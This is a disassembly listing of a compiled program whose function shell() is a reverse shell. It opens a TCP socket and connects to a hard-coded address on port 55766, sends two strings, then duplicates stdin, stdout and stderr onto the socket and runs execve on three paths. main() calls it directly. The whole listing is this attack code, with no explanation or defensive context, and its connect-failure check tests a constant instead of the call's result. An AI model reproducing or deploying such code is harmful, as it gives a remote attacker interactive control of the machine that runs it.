dup2@plt-0x10:
 pushq  0x200742(%rip)        # 600e28 <_GLOBAL_OFFSET_TABLE_+0x8>
 jmpq   *0x200744(%rip)        # 600e30 <_GLOBAL_OFFSET_TABLE_+0x10>
 nopl   0x0(%rax)
dup2@plt:
 jmpq   *0x200742(%rip)        # 600e38 <_GLOBAL_OFFSET_TABLE_+0x18>
 pushq  $0x0
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
memset@plt:
 jmpq   *0x20073a(%rip)        # 600e40 <_GLOBAL_OFFSET_TABLE_+0x20>
 pushq  $0x1
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
htons@plt:
 jmpq   *0x200732(%rip)        # 600e48 <_GLOBAL_OFFSET_TABLE_+0x28>
 pushq  $0x2
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
setsockopt@plt:
 jmpq   *0x20072a(%rip)        # 600e50 <_GLOBAL_OFFSET_TABLE_+0x30>
 pushq  $0x3
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
connect@plt:
 jmpq   *0x200722(%rip)        # 600e58 <_GLOBAL_OFFSET_TABLE_+0x38>
 pushq  $0x4
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
execve@plt:
 jmpq   *0x20071a(%rip)        # 600e60 <_GLOBAL_OFFSET_TABLE_+0x40>
 pushq  $0x5
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
socket@plt:
 jmpq   *0x200712(%rip)        # 600e68 <_GLOBAL_OFFSET_TABLE_+0x48>
 pushq  $0x6
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
send@plt:
 jmpq   *0x20070a(%rip)        # 600e70 <_GLOBAL_OFFSET_TABLE_+0x50>
 pushq  $0x7
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
perror@plt:
 jmpq   *0x200702(%rip)        # 600e78 <_GLOBAL_OFFSET_TABLE_+0x58>
 pushq  $0x8
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
fflush@plt:
 jmpq   *0x2006f2(%rip)        # 600e88 <_GLOBAL_OFFSET_TABLE_+0x68>
 pushq  $0xa
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
inet_addr@plt:
 jmpq   *0x2006ea(%rip)        # 600e90 <_GLOBAL_OFFSET_TABLE_+0x70>
 pushq  $0xb
 jmpq   4006e0 <.debug_info_seg+0x4006e0>
_Z5shellv:
 push   %rbp
 mov    %rsp,%rbp
 sub    $0x70,%rsp
 mov    %rbx,-0x8(%rbp)
 lea    -0x64(%rbp),%rax
 mov    $0x0,%edx
 mov    $0x8,%ecx
 mov    %rax,%rdi
 mov    %edx,%esi
 mov    %rcx,%rdx
 callq  400700 <memset@plt>
 mov    %rax,-0x28(%rbp)
 movw   $0x2,-0x6c(%rbp)
 mov    $0x400a90,%eax
 mov    %rax,%rdi
 callq  4007a0 <inet_addr@plt>
 mov    %eax,-0x5c(%rbp)
 mov    -0x5c(%rbp),%eax
 mov    %eax,-0x68(%rbp)
 mov    $0xd9d6,%eax
 mov    %eax,%edi
 callq  400710 <htons@plt>
 mov    %ax,-0x70(%rbp)
 movzwl -0x70(%rbp),%eax
 mov    %ax,-0x6a(%rbp)
 mov    $0x2,%eax
 mov    $0x1,%edx
 mov    $0x0,%ecx
 mov    %eax,%edi
 mov    %edx,%esi
 mov    %ecx,%edx
 callq  400750 <socket@plt>
 mov    %eax,-0x58(%rbp)
 mov    -0x58(%rbp),%eax
 mov    %eax,-0x54(%rbp)
 mov    -0x54(%rbp),%eax
 lea    -0x6c(%rbp),%rdx
 mov    $0x10,%ecx
 mov    %eax,%edi
 mov    %rdx,%rsi
 mov    %ecx,%edx
 callq  400730 <connect@plt>
 mov    %eax,-0x50(%rbp)
 mov    $0x400730,%eax
 test   %rax,%rax
 jne    40092c <_Z5shellv+0xb4>
 mov    $0x400a9c,%eax
 mov    %rax,%rdi
 callq  400770 <perror@plt>
 movl   $0x1,-0x4c(%rbp)
 mov    -0x54(%rbp),%eax
 mov    $0x1,%edx
 mov    $0x2,%ecx
 lea    -0x4c(%rbp),%rbx
 mov    $0x4,%esi
 mov    %eax,%edi
 mov    %esi,-0x10(%rbp)
 mov    %edx,%esi
 mov    %ecx,%edx
 mov    %rbx,%rcx
 mov    -0x10(%rbp),%eax
 mov    %eax,%r8d
 callq  400720 <setsockopt@plt>
 mov    %eax,-0x48(%rbp)
 mov    -0x48(%rbp),%eax
 test   %eax,%eax
 jge    400977 <_Z5shellv+0xff>
 mov    $0x400ac8,%eax
 mov    %rax,%rdi
 callq  400770 <perror@plt>
 mov    -0x54(%rbp),%eax
 mov    $0x400ae8,%edx
 mov    $0xc,%ecx
 mov    $0x0,%ebx
 mov    %eax,%edi
 mov    %rdx,%rsi
 mov    %rcx,%rdx
 mov    %ebx,%ecx
 callq  400760 <send@plt>
 mov    %rax,-0x20(%rbp)
 mov    -0x54(%rbp),%eax
 mov    $0x400af4,%edx
 mov    $0x7,%ecx
 mov    $0x0,%ebx
 mov    %eax,%edi
 mov    %rdx,%rsi
 mov    %rcx,%rdx
 mov    %ebx,%ecx
 callq  400760 <send@plt>
 mov    %rax,-0x18(%rbp)
 mov    0x2004d8(%rip),%rax        # 600ea0 <__TMC_END__>
 mov    %rax,%rdi
 callq  400790 <fflush@plt>
 mov    %eax,-0x44(%rbp)
 mov    -0x54(%rbp),%eax
 mov    $0x0,%edx
 mov    %eax,%edi
 mov    %edx,%esi
 callq  4006f0 <dup2@plt>
 mov    %eax,-0x40(%rbp)
 mov    -0x54(%rbp),%eax
 mov    $0x1,%edx
 mov    %eax,%edi
 mov    %edx,%esi
 callq  4006f0 <dup2@plt>
 mov    %eax,-0x3c(%rbp)
 mov    -0x54(%rbp),%eax
 mov    $0x2,%edx
 mov    %eax,%edi
 mov    %edx,%esi
 callq  4006f0 <dup2@plt>
 mov    %eax,-0x38(%rbp)
 mov    $0x400b00,%eax
 mov    $0x0,%edx
 mov    $0x0,%ecx
 mov    %rax,%rdi
 mov    %rdx,%rsi
 mov    %rcx,%rdx
 callq  400740 <execve@plt>
 mov    %eax,-0x34(%rbp)
 mov    $0x400b08,%eax
 mov    $0x0,%edx
 mov    $0x0,%ecx
 mov    %rax,%rdi
 mov    %rdx,%rsi
 mov    %rcx,%rdx
 callq  400740 <execve@plt>
 mov    %eax,-0x30(%rbp)
 mov    $0x400b28,%eax
 mov    $0x0,%edx
 mov    $0x0,%ecx
 mov    %rax,%rdi
 mov    %rdx,%rsi
 mov    %rcx,%rdx
 callq  400740 <execve@plt>
 mov    %eax,-0x2c(%rbp)
 mov    -0x8(%rbp),%rbx
 leaveq 
 retq   
main:
 push   %rbp
 mov    %rsp,%rbp
 sub    $0x10,%rsp
 mov    %edi,-0x10(%rbp)
 mov    %rsi,-0x8(%rbp)
 callq  400878 <_Z5shellv>
 mov    $0x0,%eax
 leaveq 
 retq   
